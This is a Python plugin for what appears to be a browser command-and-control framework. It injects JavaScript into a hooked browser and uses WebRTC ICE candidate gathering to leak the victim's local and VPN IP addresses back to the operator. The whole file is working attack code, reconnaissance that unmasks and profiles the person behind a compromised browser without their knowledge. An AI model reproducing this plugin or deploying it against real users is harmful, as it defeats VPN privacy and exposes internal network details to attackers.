from c2.plugins.internal.plugins import BasePlugin


class WebRTCLeaksPlugin(BasePlugin):
    name = "webrtcleaks"

    async def get_ips(self) -> list:
        """Discovers local/VPN IP addresses that the browser leaks via WebRTC.

        Creates an RTCPeerConnection, adds a data channel to trigger ICE candidate
        gathering, and extracts IPv4 addresses from the candidate lines.

        The IP is read from the correct token (index 4) in the candidate string:
            candidate:<foundation> <comp> <proto> <priority> <ip> <port> typ <type>

        No STUN/TURN servers are used so only host candidates (local interfaces)
        are gathered.  Chrome may hide local IPs depending on its
        "WebRTC IP handling policy" setting — in that case an empty list is returned.

        :return: List of unique IPv4 addresses discovered
        :rtype: list
        """
        return await self.methods.eval_js('''
            return new Promise(function(resolve) {
                var ips  = [];
                var seen = new Set();
                var done = false;

                var finish = function() {
                    if (done) return;
                    done = true;
                    try { pc.close(); } catch(e) {}
                    resolve(ips);
                };

                try {
                    var pc = new RTCPeerConnection({ iceServers: [], iceTransportPolicy: 'all' });

                    pc.onicecandidate = function(e) {
                        if (!e.candidate) { finish(); return; }

                        // Candidate SDP line:
                        //   candidate:<f> <comp> <proto> <pri> <IP> <port> typ <type> ...
                        var parts = e.candidate.candidate.split(' ');
                        if (parts.length >= 5) {
                            var ip = parts[4];
                            if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip) && !seen.has(ip)) {
                                seen.add(ip);
                                ips.push(ip);
                            }
                        }
                    };

                    pc.onicegatheringstatechange = function() {
                        if (pc.iceGatheringState === 'complete') finish();
                    };

                    pc.createDataChannel('x');
                    pc.createOffer()
                        .then(function(o) { return pc.setLocalDescription(o); })
                        .catch(finish);

                } catch(e) {
                    resolve([]);
                    return;
                }

                setTimeout(finish, 5000);
            });
        ''', timeout=8)
